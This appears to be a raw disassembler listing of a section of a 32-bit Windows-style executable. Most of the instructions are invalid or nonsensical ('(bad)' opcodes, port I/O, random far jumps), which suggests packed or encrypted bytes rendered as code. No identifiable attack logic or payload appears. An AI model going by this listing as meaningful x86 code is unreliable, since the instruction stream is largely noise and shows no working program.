  40f00a:	shl    cl,0x30
  40f00d:	bound  edi,QWORD PTR [ebp+0x2af8e116]
  40f013:	inc    esi
  40f014:	xchg   ebx,eax
  40f015:	pop    ecx
  40f016:	xchg   edx,eax
  40f017:	inc    edi
  40f018:	or     BYTE PTR [ebx],dl
  40f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f01b:	jbe    0x40f007
  40f01d:	sbb    ch,BYTE PTR [ecx+0x5b35e67b]
  40f023:	and    BYTE PTR [esi+0x3],dh
  40f026:	or     dh,ch
  40f028:	out    0x3b,eax
  40f02a:	jmp    0x40efd2
  40f02c:	in     eax,0x54
  40f02e:	pop    esi
  40f02f:	add    BYTE PTR [eax+0x66],cl
  40f032:	jecxz  0x40f00f
  40f034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f035:	popf   
  40f036:	mov    al,es:0xd6c0c9a7
  40f03c:	dec    esi
  40f03d:	sub    DWORD PTR [ecx+0x30],edx
  40f040:	inc    esi
  40f041:	jmp    0x40effa
  40f043:	add    eax,0x934ad198
  40f048:	sub    BYTE PTR [ecx+0x38a93251],ch
  40f04e:	lahf   
  40f04f:	jecxz  0x40f075
  40f051:	cli    
  40f052:	and    al,0xb7
  40f054:	sub    al,0x54
  40f056:	mov    ?,WORD PTR ds:0x83ad844a
  40f05c:	inc    ebx
  40f05d:	out    dx,al
  40f05e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f05f:	push   esp
  40f060:	adc    al,0x58
  40f062:	pop    esi
  40f063:	xchg   edi,eax
  40f064:	scas   al,BYTE PTR es:[edi]
  40f065:	mov    dl,0xac
  40f067:	or     al,BYTE PTR [esi]
  40f069:	stos   BYTE PTR es:[edi],al
  40f06a:	aad    0x81
  40f06c:	js     0x40f00d
  40f06e:	xor    al,0x2d
  40f070:	outs   dx,BYTE PTR ds:[esi]
  40f071:	push   0x3caac87d
  40f076:	adc    ecx,DWORD PTR [eax]
  40f078:	jb     0x40f0de
  40f07a:	pusha  
  40f07b:	out    0x74,eax
  40f07d:	rcr    bh,1
  40f07f:	mov    bh,0x77
  40f081:	cmp    cl,ch
  40f083:	enter  0xffdf,0x7e
  40f087:	sub    ecx,DWORD PTR [ecx]
  40f089:	aam    0x54
  40f08b:	cli    
  40f08c:	ins    BYTE PTR es:[edi],dx
  40f08d:	clc    
  40f08e:	inc    esi
  40f08f:	inc    eax
  40f090:	and    esi,eax
  40f092:	or     DWORD PTR [ecx*2+0x412a01b3],esi
  40f099:	xchg   esp,eax
  40f09a:	add    BYTE PTR [ecx],dh
  40f09c:	push   esi
  40f09d:	in     al,dx
  40f09e:	sbb    al,0xb0
  40f0a0:	dec    esi
  40f0a1:	leave  
  40f0a2:	or     edi,0xe88b5741
  40f0a8:	xor    DWORD PTR [eax-0x415f01e2],esp
  40f0ae:	cmp    al,BYTE PTR [ebx+0x4f]
  40f0b1:	fwait
  40f0b2:	xchg   ah,bl
  40f0b4:	je     0x40f10a
  40f0b6:	scas   eax,DWORD PTR es:[edi]
  40f0b7:	rcr    BYTE PTR [edx+eax*1],1
  40f0ba:	fild   QWORD PTR [edx-0x196a995f]
  40f0c0:	popa   
  40f0c1:	jo     0x40f0e6
  40f0c3:	add    bh,bh
  40f0c5:	fiadd  WORD PTR [esi-0x5e]
  40f0c8:	std    
  40f0c9:	lea    ecx,[edi]
  40f0cb:	icebp  
  40f0cc:	sub    BYTE PTR [ebp+edi*2+0x5c],0x72
  40f0d1:	add    eax,0xc1226ff1
  40f0d6:	jae    0x40f0a2
  40f0d8:	mov    ebp,DWORD PTR [ebx-0x2e]
  40f0db:	repz cwde 
  40f0dd:	stos   BYTE PTR es:[edi],al
  40f0de:	xchg   ebx,eax
  40f0df:	mov    cl,BYTE PTR [ebx]
  40f0e1:	dec    edx
  40f0e2:	(bad)  
  40f0e3:	jmp    0xd6fa58cf
  40f0e8:	sub    ebp,DWORD PTR [eax]
  40f0ea:	and    ch,BYTE PTR [ebp+0x26dba494]
  40f0f0:	mov    dh,0xe9
  40f0f2:	inc    esi
  40f0f3:	xchg   esi,eax
  40f0f4:	push   edi
  40f0f5:	xchg   DWORD PTR [edx+0x35a9b19f],ebp
  40f0fb:	jnp    0x40f124
  40f0fd:	add    ebx,esp
  40f0ff:	jecxz  0x40f15d
  40f101:	imul   eax,DWORD PTR [edx],0x7d
  40f104:	dec    eax
  40f105:	dec    eax
  40f106:	mov    edx,DWORD PTR [ecx+0x70]
  40f109:	not    BYTE PTR [ebx]
  40f10b:	sub    al,0x2f
  40f10d:	cmp    esi,DWORD PTR [esp+ebp*2]
  40f110:	xchg   esp,esp
  40f112:	test   eax,0xf695a42b
  40f117:	loope  0x40f0b0
  40f119:	xor    al,0x5c
  40f11b:	out    0x99,eax
  40f11d:	inc    ecx
  40f11e:	dec    eax
  40f11f:	adc    ecx,DWORD PTR [edx]
  40f121:	mov    ds:0x69d2874b,al
  40f126:	cwde   
  40f127:	retf   0x77cb
  40f12a:	push   edx
  40f12b:	daa    
  40f12c:	add    BYTE PTR [edi+0x1c],dh
  40f12f:	inc    ebx
  40f130:	xchg   DWORD PTR [ecx],edi
  40f132:	push   esp
  40f133:	dec    ecx
  40f134:	mov    ds:0x6eb82acf,al
  40f139:	hlt    
  40f13a:	es jno 0x40f13e
  40f13d:	sti    
  40f13e:	(bad)  
  40f13f:	lock pop edi
  40f141:	xor    ah,bl
  40f143:	std    
  40f144:	dec    esp
  40f145:	jmp    0x290c:0x6b71e8df
  40f14c:	jl     0x40f197
  40f14e:	cmp    dl,BYTE PTR [edi-0x3a]
  40f151:	xor    al,0x48
  40f153:	les    esi,FWORD PTR [edi+0x64]
  40f156:	and    bl,dh
  40f158:	adc    ebx,DWORD PTR [esi-0x1a854916]
  40f15e:	mov    WORD PTR [ebx-0x60cd301e],cs
  40f164:	shr    DWORD PTR [ebp+0x77],1
  40f167:	adc    DWORD PTR [edx+0x15639e8e],edx
  40f16d:	(bad)  
  40f16e:	stos   DWORD PTR es:[edi],eax
  40f16f:	xchg   bl,ch
  40f171:	aad    0x28
  40f173:	aad    0xdd
  40f175:	push   ss
  40f176:	sbb    DWORD PTR [edi+eiz*8-0x493540f4],ebp
  40f17d:	dec    esi
  40f17e:	sbb    al,0x31
  40f180:	push   edx
  40f181:	mov    bh,0x36
  40f183:	jle    0x40f1ed
  40f185:	cmc    
  40f186:	ret    0x20d1
  40f189:	dec    esp
  40f18a:	fstp   QWORD PTR [ebx+ebp*1+0x1ff78c66]
  40f191:	mov    edx,DWORD PTR [ecx]
  40f193:	mov    gs,WORD PTR [ebp-0xaf2b035]
  40f199:	leave  
  40f19a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f19b:	daa    
  40f19c:	jg     0x40f12e
  40f19e:	div    DWORD PTR [edx-0x7378095d]
  40f1a4:	fdivr  st(5),st
  40f1a6:	dec    eax
  40f1a7:	(bad)  
  40f1a8:	and    dl,BYTE PTR [eax+0x26]
  40f1ab:	aam    0x5c
  40f1ad:	sti    
  40f1ae:	fcomi  st,st(5)
  40f1b0:	inc    esp
  40f1b1:	mov    eax,ds:0x8e7a564
  40f1b6:	fsub   st,st(7)
  40f1b8:	mov    ebp,0xc09752f8
  40f1bd:	call   0x8bd1:0x736eaa4a
  40f1c4:	or     al,0x74
  40f1c6:	test   al,0x12
  40f1c8:	fist   DWORD PTR [ecx]
  40f1ca:	test   eax,0x3023543f
  40f1cf:	sbb    DWORD PTR [ecx],esi
  40f1d1:	jge    0x40f21a
  40f1d3:	sahf   
  40f1d4:	shr    ebp,1
  40f1d6:	fwait
  40f1d7:	mov    esp,0x6f07724d
  40f1dc:	cmc    
  40f1dd:	ins    DWORD PTR es:[edi],dx
  40f1de:	leave  
  40f1df:	(bad)  
  40f1e0:	ffreep st(3)
  40f1e2:	jnp    0x40f1b2
  40f1e4:	idiv   cl
  40f1e6:	out    dx,al
  40f1e7:	xor    BYTE PTR [ebx-0x9],dh
  40f1ea:	xchg   esp,eax
  40f1eb:	pop    ebx
  40f1ec:	mov    ebp,0xdc4aac07
  40f1f1:	and    BYTE PTR [esi+0x4f],0x81
  40f1f5:	xchg   DWORD PTR [edi-0x2e],ebx
  40f1f8:	neg    DWORD PTR es:[ebx]
  40f1fb:	xchg   esi,eax
  40f1fc:	sub    eax,0xff35206a
  40f201:	or     BYTE PTR [ecx+0x75],0x27
  40f205:	out    dx,al
  40f206:	xor    BYTE PTR [esi+ecx*4],dl
  40f209:	and    DWORD PTR [eax],ecx
  40f20b:	jno    0x40f26e
  40f20d:	mov    dl,0x28
  40f20f:	call   0x45e97268
  40f214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f215:	dec    esi
  40f216:	arpl   WORD PTR [edx-0x28],ax
  40f219:	xor    eax,ebp
  40f21b:	(bad)  
  40f21c:	idiv   DWORD PTR [esi-0x3c]
  40f21f:	inc    ebx
  40f220:	pop    ds
  40f221:	das    
  40f222:	stos   BYTE PTR es:[edi],al
  40f223:	bound  esp,QWORD PTR [eax-0x30]
  40f226:	es sub ch,0x54
  40f22a:	push   0x18
  40f22c:	pop    ss
  40f22d:	loopne 0x40f1ff
  40f22f:	sbb    DWORD PTR [eax],ebp
  40f231:	cmp    bl,dh
  40f233:	sub    al,0x72
  40f235:	jmp    0xc515:0x2c5c4f40
  40f23c:	ret    
  40f23d:	and    DWORD PTR [ecx-0x14],edi
  40f240:	mov    ch,0xa5
  40f242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f243:	les    esp,FWORD PTR [esi-0x3c]
  40f246:	jecxz  0x40f205
  40f248:	or     al,0x3d
  40f24a:	and    DWORD PTR [esi],ecx
  40f24c:	int3   
  40f24d:	mov    WORD PTR [ecx+0x5771fb7b],gs
  40f253:	mov    al,ds:0x8a196d5f
  40f258:	das    
  40f259:	or     BYTE PTR [ecx],0x95
  40f25c:	dec    esp
  40f25d:	loopne 0x40f2bd
  40f25f:	jg     0x40f2c6
  40f261:	add    eax,0xfa9fd729
  40f266:	sti    
  40f267:	je     0x40f295
  40f269:	xchg   esp,eax
  40f26a:	xor    eax,0x1d224426
  40f26f:	xor    ebp,ecx
  40f271:	lods   al,BYTE PTR ds:[esi]
  40f272:	mov    al,ds:0xa9d440ad
  40f277:	sbb    eax,0xec6cb6c
  40f27c:	popf   
  40f27d:	imul   edi,edx,0xfccda02
  40f283:	adc    eax,0xd08080ba
  40f288:	or     DWORD PTR [esp+edi*2+0x3cb7bd53],esp
  40f28f:	sub    DWORD PTR [edi+0x4b634ab4],0x7
  40f296:	cmp    eax,0x940090e8
  40f29b:	and    eax,DWORD PTR [edi]
  40f29d:	ss ss (bad) ds:[ecx]
  40f2a2:	stos   DWORD PTR es:[edi],eax
  40f2a3:	and    edx,edi
  40f2a5:	xchg   BYTE PTR [edi+0x34],ah
  40f2a8:	xchg   edx,eax
  40f2a9:	dec    esp
  40f2aa:	dec    ecx
  40f2ab:	in     al,dx
  40f2ac:	jnp    0x40f26c
  40f2ae:	adc    esp,DWORD PTR [ebx+edi*8+0x5fe344a5]
  40f2b5:	push   edx
  40f2b6:	out    0x2f,eax
  40f2b8:	pop    esi
  40f2b9:	js     0x40f2c3
  40f2bb:	(bad)  [ecx-0x32]
  40f2be:	in     eax,0x48
  40f2c0:	push   ebx
  40f2c1:	retf   0xa471
  40f2c4:	mov    BYTE PTR [esi],dh
  40f2c6:	pop    ds
  40f2c7:	sub    bl,BYTE PTR [edi+0x7ad068f6]
  40f2cd:	je     0x40f32b
  40f2cf:	jne    0x40f2ff
  40f2d1:	add    eax,0x768c878c
  40f2d6:	in     al,0x7f
  40f2d8:	bound  ecx,QWORD PTR [esi+0x31]
  40f2db:	fwait
  40f2dc:	in     al,dx
  40f2dd:	jo     0x40f311
  40f2df:	(bad)  
  40f2e0:	sbb    eax,0xa6fbbdef
  40f2e5:	push   ebx
  40f2e6:	in     eax,0xd
  40f2e8:	xor    DWORD PTR [ebx-0x43],esi
  40f2eb:	inc    eax
  40f2ec:	clc    
  40f2ed:	bound  ebp,QWORD PTR [edx-0x2]
  40f2f0:	lea    eax,[edx]
  40f2f2:	shl    DWORD PTR [ebx],0xc6
  40f2f5:	add    eax,edi
  40f2f7:	push   eax
  40f2f8:	mov    eax,DWORD PTR [ebp-0x18]
  40f2fb:	add    eax,0xee
  40f300:	push   eax
  40f301:	mov    eax,DWORD PTR [ebp-0x18]
  40f304:	mov    eax,DWORD PTR [eax+0x198]
  40f30a:	jmp    0x40f815
  40f30f:	enter  0x3ec7,0xce
  40f313:	aad    0xd5
  40f315:	enter  0x6cc5,0x2b
  40f319:	xchg   edi,eax
  40f31a:	and    eax,esi
  40f31c:	sahf   
  40f31d:	jne    0x40f34a
  40f31f:	pusha  
  40f320:	push   eax
  40f321:	js     0x40f39b
  40f323:	push   0x7c
  40f325:	js     0x40f39f
  40f327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f328:	xchg   esp,eax
  40f329:	pop    edx
  40f32a:	sti    
  40f32b:	dec    ecx
  40f32c:	dec    esi
  40f32d:	fistp  QWORD PTR [edx]
  40f32f:	cdq    
  40f330:	pop    ds
  40f331:	mov    DWORD PTR [esi-0x5eaf8482],ebx
  40f337:	or     BYTE PTR [edx+0x71763f36],bl
  40f33d:	adc    eax,0x8b61fc4e
  40f342:	xchg   edx,eax
  40f343:	sahf   
  40f344:	es pusha 
  40f346:	mov    ecx,0xe69ffb77
  40f34b:	mov    ah,0x2f
  40f34d:	mov    WORD PTR [edi+0x6a],?
  40f350:	jns    0x40f369
  40f352:	dec    edi
  40f353:	call   0xe0be:0x434f94df
  40f35a:	add    BYTE PTR [esi-0x31b733ae],ch
  40f360:	adc    al,0x64
  40f362:	push   0xffffffd0
  40f364:	pop    eax
  40f365:	push   esp
  40f366:	mov    ds:0x6293b723,eax
  40f36b:	dec    ebp
  40f36c:	pop    ebx
  40f36d:	mov    edi,0x756afeca
  40f372:	aas    
  40f373:	cmp    BYTE PTR [edx+0x66e4eea0],cl
  40f379:	stc    
  40f37a:	add    eax,0x68b8360e
  40f37f:	cs cs pushfw 
  40f383:	pusha  
  40f384:	mov    ax,ds:0x4b8e8a8c
  40f38a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f38b:	mov    ch,0xc9
  40f38d:	popa   
  40f38e:	in     eax,dx
  40f38f:	stos   BYTE PTR es:[edi],al
  40f390:	add    ecx,DWORD PTR [ecx]
  40f392:	ficomp WORD PTR [eax-0xb]
  40f395:	lea    ecx,[ecx+ecx*4]
  40f398:	add    ebx,DWORD PTR [ebx-0x38]
  40f39b:	in     al,dx
  40f39c:	rcl    DWORD PTR [ecx-0x76c1eb5e],cl
  40f3a2:	mov    ebp,DWORD PTR ss:[ebx+0x45]
  40f3a6:	mov    dl,0x22
  40f3a8:	in     eax,0x24
  40f3aa:	and    al,BYTE PTR [ebp-0x359911bd]
  40f3b0:	push   edx
  40f3b1:	jno    0x40f3d2
  40f3b3:	loop   0x40f33d
  40f3b5:	mov    ebx,0x4e89a79e
  40f3ba:	cmp    DWORD PTR [ebx+0x42],ecx
  40f3bd:	xor    BYTE PTR [ecx-0x7f],0x49
  40f3c1:	pop    edi
  40f3c2:	aas    
  40f3c3:	xchg   edx,eax
  40f3c4:	xor    al,0xd8
  40f3c6:	jecxz  0x40f363
  40f3c8:	dec    edx
  40f3c9:	rcl    DWORD PTR [esi+0x1afd5b0d],0xaf
  40f3d0:	sub    BYTE PTR [ebp+edx*4+0x6dabd0a7],ah
  40f3d7:	lods   eax,DWORD PTR ds:[esi]
  40f3d8:	repnz clc 
  40f3da:	ins    BYTE PTR es:[edi],dx
  40f3db:	cmp    bl,ah
  40f3dd:	or     al,0x2f
  40f3df:	hlt    
  40f3e0:	pop    ds
  40f3e1:	or     ecx,0xffffffd2
  40f3e4:	jno    0x40f3a2
  40f3e6:	popf   
  40f3e7:	bound  ebp,QWORD PTR [ebx]
  40f3e9:	fiadd  WORD PTR [edx+ebp*8]
  40f3ec:	fld    QWORD PTR ds:0xb52eee85
  40f3f2:	je     0x40f3d7
  40f3f4:	mov    eax,ds:0x2471f687
  40f3f9:	xor    al,0x83
  40f3fb:	cs scas eax,DWORD PTR es:[edi]
  40f3fd:	or     ah,BYTE PTR [esi+esi*1+0x36d857a9]
  40f404:	pop    ds
  40f405:	out    0xbd,eax
  40f407:	xor    bl,BYTE PTR [edx-0x40]
  40f40a:	imul   ebp,ebp,0xffffff81
  40f40d:	pop    eax
  40f40e:	mov    esp,0xd0c03138
  40f413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f414:	std    
  40f415:	icebp  
  40f416:	cmc    
  40f417:	xchg   esi,eax
  40f418:	addr16 jle 0x40f48a
  40f41b:	mov    ?,WORD PTR [edx-0x1528bc8d]
  40f421:	adc    ebx,edi
  40f423:	rcl    DWORD PTR [ecx],1
  40f425:	pop    ds
  40f426:	fdivr  QWORD PTR [edx-0x2]
  40f429:	add    al,0xbd
  40f42b:	sbb    ax,0x3c04
  40f42f:	jae    0x40f3d6
  40f431:	imul   esp,DWORD PTR [ecx+eiz*4-0x26],0x3e7feb17
  40f439:	mov    WORD PTR [edi-0x44],ds
  40f43c:	je     0x40f4b8
  40f43e:	hlt    
  40f43f:	mov    ds:0xcdcc855e,eax
  40f444:	and    esi,DWORD PTR [edi+edx*2-0x55]
  40f448:	dec    eax
  40f449:	inc    ebp
  40f44a:	shr    eax,1
  40f44c:	push   ecx
  40f44d:	js     0x40f3fb
  40f44f:	cmp    ebx,ecx
  40f451:	outs   dx,DWORD PTR ds:[esi]
  40f452:	mov    edx,0xc2ba4af1
  40f457:	pop    edi
  40f458:	pop    ebx
  40f459:	outs   dx,DWORD PTR ds:[esi]
  40f45a:	cdq    
  40f45b:	clc    
  40f45c:	outs   dx,DWORD PTR ds:[esi]
  40f45d:	icebp  
  40f45e:	mov    bh,0x74
  40f460:	out    dx,al
  40f461:	into   
  40f462:	pop    eax
  40f463:	dec    eax
  40f464:	fidivr DWORD PTR [ebx+0x72bfe57e]
  40f46a:	inc    esi
  40f46b:	in     al,0x89
  40f46d:	and    BYTE PTR [edi],al
  40f46f:	mov    ebx,0x7d782f3b
  40f474:	dec    esp
  40f475:	cmp    edi,DWORD PTR [eax+0x45943dde]
  40f47b:	loop   0x40f4fc
  40f47d:	mov    fs:0x13ead78e,al
  40f483:	sbb    esp,esp
  40f485:	jnp    0x40f4dc
  40f487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f488:	icebp  
  40f489:	pop    ds
  40f48a:	popf   
  40f48b:	mov    dl,0x79
  40f48d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f48e:	dec    esp
  40f48f:	xor    ah,BYTE PTR [ecx+0x8c57cb0]
  40f495:	scas   al,BYTE PTR es:[edi]
  40f496:	in     eax,0x4d
  40f498:	pop    ds
  40f499:	lahf   
  40f49a:	lods   al,BYTE PTR ds:[esi]
  40f49b:	mov    ch,0x1e
  40f49d:	dec    edi
  40f49e:	popf   
  40f49f:	mov    al,ds:0xd44949a3
  40f4a4:	or     DWORD PTR [ebx-0xe],esp
  40f4a7:	push   0xffffffee
  40f4a9:	test   eax,0x6de75270
  40f4ae:	mov    al,ds:0xaab74572
  40f4b3:	scas   eax,DWORD PTR es:[edi]
  40f4b4:	call   eax
  40f4b6:	rcr    DWORD PTR [edi+eiz*2-0x60],cl
  40f4ba:	test   al,0xc5
  40f4bc:	popa   
  40f4bd:	and    al,0x3c
  40f4bf:	pop    ebp
  40f4c0:	aaa    
  40f4c1:	test   al,0x5
  40f4c3:	adc    al,0x1f
  40f4c5:	loop   0x40f528
  40f4c7:	popf   
  40f4c8:	jle    0x40f4aa
  40f4ca:	icebp  
  40f4cb:	jnp    0x40f457
  40f4cd:	jl     0x40f47a
  40f4cf:	jno    0x40f4a9
  40f4d1:	inc    edx
  40f4d2:	add    ch,BYTE PTR [esi]
  40f4d4:	mov    ebp,0x487970fe
  40f4d9:	push   edx
  40f4da:	retf   
  40f4db:	scas   al,BYTE PTR es:[edi]
  40f4dc:	test   al,0xd1
  40f4de:	(bad)  
  40f4df:	jns    0x40f509
  40f4e1:	fiadd  DWORD PTR [edx+0x42]
  40f4e4:	push   ecx
  40f4e5:	xor    BYTE PTR [ebp-0x11],bl
  40f4e8:	push   ss
  40f4e9:	dec    ebp
  40f4ea:	cmp    eax,0x613cd5fa
  40f4ef:	add    bh,0x8c
  40f4f2:	xchg   ebp,eax
  40f4f3:	pop    eax
  40f4f4:	cwde   
  40f4f5:	into   
  40f4f6:	and    DWORD PTR [ebx],0xffffffc5
  40f4f9:	or     DWORD PTR [esi+0x5cfc7a5a],ebp
  40f4ff:	or     eax,0xba6f21ad
  40f504:	xchg   esi,eax
  40f505:	mov    edx,0x256e4d2e
  40f50a:	sbb    ch,BYTE PTR [edx-0x66]
  40f50d:	mov    ds:0xec7e30ec,al
  40f512:	xchg   edi,eax
  40f513:	das    
  40f514:	sbb    DWORD PTR [ebp-0x1],ebx
  40f517:	pop    es
  40f518:	jl     0x40f530
  40f51a:	mov    ds:0x2728cfcb,al
  40f51f:	inc    edx
  40f520:	mov    esi,0xcd24df12
  40f525:	cmp    ch,BYTE PTR [edx-0x6a]
  40f528:	xchg   ecx,eax
  40f529:	jmp    0xb04f683b
  40f52e:	xchg   edi,eax
  40f52f:	mov    edi,0xe3ce2f1b
  40f534:	aam    0xe8
  40f536:	add    al,0x38
  40f538:	dec    esi
  40f539:	add    cl,dl
  40f53b:	cmp    ecx,ebx
  40f53d:	push   ds
  40f53e:	gs sahf 
  40f540:	rol    BYTE PTR [esi-0x5a],0x6c
  40f544:	sbb    BYTE PTR [ebx-0x3293be02],ch
  40f54a:	or     al,0xec
  40f54c:	retf   
  40f54d:	int3   
  40f54e:	mov    cl,0x47
  40f550:	dec    ebp
  40f551:	push   ecx
  40f552:	pop    ds
  40f553:	inc    eax
  40f554:	cmp    BYTE PTR [ebp-0x40],ah
  40f557:	sbb    cl,cl
  40f559:	pop    ss
  40f55a:	or     eax,0x7fd01910
  40f55f:	test   BYTE PTR ds:0x28e256b2,ah
  40f565:	push   edx
  40f566:	fadd   DWORD PTR es:[edx+0x16]
  40f56a:	xchg   esp,eax
  40f56b:	and    eax,0xb0788b6
  40f570:	out    0x1f,al
  40f572:	in     al,dx
  40f573:	add    DWORD PTR [edx-0x6],ecx
  40f576:	adc    al,0x34
  40f578:	add    eax,ebx
  40f57a:	ret    0xd0ec
  40f57d:	xchg   edx,eax
  40f57e:	add    edx,edi
  40f580:	(bad)  
  40f581:	cmc    
  40f582:	hlt    
  40f583:	cli    
  40f584:	in     al,dx
  40f585:	or     edx,DWORD PTR [eax-0x51]
  40f588:	xlat   BYTE PTR ds:[ebx]
  40f589:	push   cs
  40f58a:	sbb    al,0x2d
  40f58c:	loope  0x40f5e4
  40f58e:	shl    ah,0x36
  40f591:	push   ecx
  40f592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f593:	(bad)  [ebp-0x3d9b422c]
  40f599:	pop    edi
  40f59a:	xchg   ecx,eax
  40f59b:	or     BYTE PTR [ebp-0x6f],ch
  40f59e:	mov    ebp,0x3dfa33b4
  40f5a3:	mov    cl,ah
  40f5a5:	cmc    
  40f5a6:	(bad)  
  40f5a7:	jns    0x40f618
  40f5a9:	push   ecx
  40f5aa:	and    bl,cl
  40f5ac:	(bad)  
  40f5ad:	ror    eax,1
  40f5af:	leave  
  40f5b0:	fnstenv [ebx+ebp*8+0x2f04ddff]
  40f5b7:	js     0x40f581
  40f5b9:	and    eax,0x902d7f0e
  40f5be:	imul   edi,esp,0xffffffe7
  40f5c1:	daa    
  40f5c2:	jae    0x40f569
  40f5c4:	fs push 0x7b3a850a
  40f5ca:	das    
  40f5cb:	jmp    0xe8f4:0x17b97a8e
  40f5d2:	ret    0xfd67
  40f5d5:	mov    ah,0x26
  40f5d7:	lea    edx,[edi]
  40f5d9:	stos   BYTE PTR es:[edi],al
  40f5da:	xchg   esi,eax
  40f5db:	pop    es
  40f5dc:	dec    ebp
  40f5dd:	das    
  40f5de:	cmp    ah,BYTE PTR [esp+ecx*4]
  40f5e1:	out    dx,al
  40f5e2:	push   esp
  40f5e3:	dec    ebp
  40f5e4:	in     al,dx
  40f5e5:	test   dl,bl
  40f5e7:	xor    esi,eax
  40f5e9:	and    DWORD PTR [esp+ebx*8-0x6ca3f64c],ecx
  40f5f0:	daa    
  40f5f1:	mov    DWORD PTR [edx+0x155a596a],0x268f3fb1
  40f5fb:	(bad)  
  40f5fc:	inc    edi
  40f5fd:	jmp    0x40f58b
  40f5ff:	(bad)  
  40f600:	(bad)  
  40f601:	not    BYTE PTR [edx+0xe]
  40f604:	mov    eax,ds:0x3e1e394d
  40f609:	pop    esi
  40f60a:	xchg   esi,eax
  40f60b:	xchg   esi,eax
  40f60c:	sbb    al,0xb7
  40f60e:	fild   DWORD PTR [edx+0x670902dd]
  40f614:	nop
  40f615:	daa    
  40f616:	(bad)  
  40f617:	sub    BYTE PTR [esi],ch
  40f619:	pop    ss
  40f61a:	ins    BYTE PTR es:[edi],dx
  40f61b:	push   0x64cce309
  40f620:	dec    edi
  40f621:	shl    DWORD PTR [esi-0x469cfe64],cl
  40f627:	repnz pop esi
  40f629:	jge    0x40f627
  40f62b:	sar    BYTE PTR [eax-0x42d02f07],cl
  40f631:	aad    0xa8
  40f633:	cmp    DWORD PTR [edi],ebp
  40f635:	push   eax
  40f636:	cmp    ah,BYTE PTR [ecx-0x1eaa8442]
  40f63c:	xor    eax,0xb1111a82
  40f641:	call   0xaf7d:0x6bd646da
  40f648:	push   ebp
  40f649:	loop   0x40f679
  40f64b:	jmp    0x6ff6:0xafb834e8
  40f652:	xor    eax,0x9f5454f4
  40f657:	popa   
  40f658:	cmc    
  40f659:	cli    
  40f65a:	iret   
  40f65b:	inc    ecx
  40f65c:	or     al,0x8e
  40f65e:	push   esi
  40f65f:	in     eax,0x7f
  40f661:	mov    esi,0x91961ba6
  40f666:	sbb    ah,BYTE PTR [edi-0x6c7e9198]
  40f66c:	mov    bl,0x74
  40f66e:	popa   
  40f66f:	mov    fs,WORD PTR cs:[eax+eiz*8+0x1433d898]
  40f677:	dec    eax
  40f678:	jle    0x40f6f6
  40f67a:	dec    esi
  40f67b:	cs in  al,dx
  40f67d:	inc    ebx
  40f67e:	ins    DWORD PTR es:[edi],dx
  40f67f:	pop    ebx
  40f680:	dec    ebp
  40f681:	out    0xa5,al
  40f683:	xlat   BYTE PTR ds:[ebx]
  40f684:	mov    esp,0x6d4fa64c
  40f689:	dec    eax
  40f68a:	bound  edi,QWORD PTR [ebx-0x2]
  40f68d:	sbb    al,0xf7
  40f68f:	jns    0x40f652
  40f691:	jns    0x40f6e5
  40f693:	fbstp  TBYTE PTR [esp+eiz*2+0x58dcfaa9]
  40f69a:	(bad)  
  40f69b:	(bad)  
  40f69c:	xlat   BYTE PTR ds:[ebx]
  40f69d:	or     DWORD PTR [ecx-0x4dbd1217],eax
  40f6a3:	jmp    0x40f639
  40f6a5:	rol    DWORD PTR [ebx-0x5d69aa39],0x3f
  40f6ac:	jmp    0xa082:0x1591d608
  40f6b3:	sub    BYTE PTR ds:0x4ab4afe1,dh
  40f6b9:	adc    esi,DWORD PTR [ebp+0x25]
  40f6bc:	aam    0x54
  40f6be:	pop    ebx
  40f6bf:	ret    
  40f6c0:	pushf  
  40f6c1:	inc    edx
  40f6c2:	lea    edi,[ecx+0x7a]
  40f6c5:	mov    cl,0xa7
  40f6c7:	imul   eax,DWORD PTR ss:[edi],0x7a
  40f6cb:	repz jo 0x40f723
  40f6ce:	out    0xa8,al
  40f6d0:	mov    gs,esp
  40f6d2:	loope  0x40f707
  40f6d4:	adc    cl,BYTE PTR [ebp+0x22b0fc9c]
  40f6da:	adc    eax,0x3421b3df
  40f6df:	cmp    ebx,DWORD PTR [edx]
  40f6e1:	sub    al,0xf0
  40f6e3:	sub    al,BYTE PTR [ebx+0x72760f4b]
  40f6e9:	jle    0x40f721
  40f6eb:	xchg   BYTE PTR [ecx+0x5a6fa3bf],ah
  40f6f1:	or     ah,BYTE PTR [edx]
  40f6f3:	sbb    cl,BYTE PTR [edi-0x35]
  40f6f6:	jmp    0x40f6dc
  40f6f8:	mov    dl,0x3b
  40f6fa:	gs fcmovbe st,st(2)
  40f6fd:	cmp    eax,0xd85376e8
  40f702:	inc    edi
  40f703:	dec    ebp
  40f704:	dec    edx
  40f705:	repz xlat BYTE PTR ds:[ebx]
  40f707:	int    0xc5
  40f709:	retf   0x3682
  40f70c:	test   eax,0xb0889226
  40f711:	xchg   edx,eax
  40f712:	mov    bh,0xcf
  40f714:	xchg   BYTE PTR [ecx],bh
  40f716:	shl    ah,1
  40f718:	(bad)  
  40f719:	fisub  WORD PTR [edi+0x60]
  40f71c:	jbe    0x40f722
  40f71e:	add    al,0xd2
  40f720:	dec    edi
  40f721:	call   0xad3e:0x353c1020
  40f728:	cld    
  40f729:	lods   eax,DWORD PTR ds:[esi]
  40f72a:	adc    al,0xb2
  40f72c:	sub    al,0xa8
  40f72e:	push   0x43
  40f730:	or     eax,0x7fa040ba
  40f735:	test   dl,0x45
  40f738:	(bad)  
  40f739:	iret   
  40f73a:	call   0x9ff2af7
  40f73f:	mov    edx,edx
  40f741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f742:	shl    BYTE PTR [edx-0x5fa8948a],1
  40f748:	mov    bh,0x59
  40f74a:	inc    ebx
  40f74b:	push   cs
  40f74c:	cmp    eax,0xb393bba1
  40f751:	fistp  QWORD PTR [eax-0x3e]
